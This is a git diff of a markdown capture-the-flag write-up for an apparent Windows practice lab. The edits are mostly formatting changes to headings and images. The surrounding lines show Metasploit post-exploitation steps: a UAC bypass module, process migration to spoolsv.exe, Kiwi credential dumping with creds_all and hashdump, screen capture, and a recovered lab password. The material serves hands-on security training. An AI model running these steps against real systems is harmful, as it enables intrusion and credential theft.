@@ -176,7 +176,7 @@ run post/multi/recon/local_exploit_suggester
 exploit/windows/local/bypassuac_eventvwr
 ```
 
-## oh sry my machine got expired
+### oh sry my machine got expired
 
 ### Now we have an exploit let backgound this session using 
 ```
@@ -235,34 +235,39 @@ run
 ### The exploit ran successfully.
 
 <div align="center">
-<img src="" height=""></img>
+<img src="https://github.com/user-attachments/assets/e1754257-de53-47fe-a2ac-b47b155a3f02" height=""></img>
 </div>
-https://github.com/user-attachments/assets/e1754257-de53-47fe-a2ac-b47b155a3f02)
 
 ### Let check permission listed allows us to take ownership of files?
 ```
 getprivs
 ```
-![image](https://github.com/user-attachments/assets/c8f24c11-58d3-4e74-9ab9-80f9a4cb6c32)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/c8f24c11-58d3-4e74-9ab9-80f9a4cb6c32" height=""></img>
+</div>
 
 ### SeTakeOwnershipPrivilege allow us to take ownership.
 
-## <div align="center"> Task 5 Looting</div>
+## Task 5. Looting
 
-## Let list the process uisng command:
+### Let list the process uisng command:
 ```
 ps
 ```
 
-![image](https://github.com/user-attachments/assets/d3cad140-e1bf-4a16-b8eb-d61dec68df4c)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/d3cad140-e1bf-4a16-b8eb-d61dec68df4c" height=""></img>
+</div>
 
 ### We were going to migrate the process run by admin.
 ```
 migrate -N spoolsv.exe
 ```
 
-![image](https://github.com/user-attachments/assets/b3072cee-555e-4458-b114-769c021485ea)
-
+<div align="center">
+<img src="https://github.com/user-attachments/assets/b3072cee-555e-4458-b114-769c021485ea" height=""></img>
+</div>
 
 ### After migratre check for uid, as we sucessfully migrated and we are noW NT AUTHORITY.
 
@@ -271,7 +276,10 @@ migrate -N spoolsv.exe
 load kiwi
 ```
 * ###  Kiwi extensions to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more.
-![image](https://github.com/user-attachments/assets/e61fc830-fb43-4d0a-a7a9-2b8ae6237c12)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/e61fc830-fb43-4d0a-a7a9-2b8ae6237c12" height=""></img>
+</div>
 
 ### We can use help command to get help of kiwi.
 ### So first we going to Retrieve all credentials.
@@ -279,11 +287,13 @@ load kiwi
 creds_all
 ```
 
-![image](https://github.com/user-attachments/assets/442eb822-c961-4845-839d-2cd9eb6e9b0a)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/442eb822-c961-4845-839d-2cd9eb6e9b0a" height=""></img>
+</div>
 
 * ### The password for dark is ```Password01!```.
 
-## <div align="center">Task 6. Post-Exploitation</div>
+## Task 6. Post-Exploitation
 
 ### Let dump all the passwords.
 ```
@@ -295,7 +305,9 @@ hashdump
 screenshare
 ```
 
-![image](https://github.com/user-attachments/assets/8774abf3-f319-4e73-9ef9-919e47fa2438)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/8774abf3-f319-4e73-9ef9-919e47fa2438" height=""></img>
+</div>
 
 ### We can even record from a microphone attached to the system using command.
 ```
